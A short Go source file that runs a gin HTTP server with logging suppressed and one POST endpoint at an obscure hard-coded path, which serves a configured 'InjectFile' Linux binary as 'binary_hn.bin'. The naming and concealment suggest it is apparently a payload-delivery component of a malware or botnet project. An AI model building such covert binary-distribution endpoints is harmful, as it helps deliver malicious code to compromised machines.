package api

import (
	"fmt"
	"homo/network/config"
	"io"

	"github.com/gin-gonic/gin"
)

func StartApi(c *config.Config) {

	gin.SetMode(gin.ReleaseMode)

	gin.DefaultWriter = io.Discard
	router := gin.New()

	if !c.Api.CustomPathEnabled {
		router.POST("/SXkmarwet7vghj", File)
	} else {
		router.POST(c.Api.CustomPath, File)
	}

	fmt.Println(c.Api.Server + ":" + c.Api.Port)
	err := router.Run(c.Api.Server + ":" + c.Api.Port)
	if err != nil {
		fmt.Println(err)
	}
}

func File(c *gin.Context) {
	c.FileAttachment(config.GetConfig().InjectFile.Linux, "binary_hn.bin")
}
